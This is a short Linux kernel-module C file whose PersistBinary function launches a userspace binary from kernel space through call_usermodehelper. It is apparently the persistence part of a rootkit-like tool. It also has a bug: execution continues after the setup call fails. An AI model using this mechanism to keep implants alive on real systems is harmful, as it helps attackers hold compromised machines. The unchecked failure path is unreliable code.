#include "persist.h"
#include "common.h"

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/types.h>

int PersistBinary(const char *binary_path, char **argv)
{

    int exit_code = INAT_FAILURE;
    int ret = 0;
    char *envp[] = {NULL};
    struct subprocess_info *sub_info;

    if (NULL == binary_path)
    {
        goto end;
    }

    if (NULL == argv)
    {
        goto end;
    }

    sub_info = call_usermodehelper_setup(binary_path, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (NULL == sub_info)
    {
        printk("call_usermodehelper_setup failed");
    }
    ret = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    if (ret)
    {

        printk("call_usermodehelper_exec exited with exitcode %d", ret);
        goto end;
    }

    exit_code = INAT_SUCCESS;
end:
    return exit_code;
}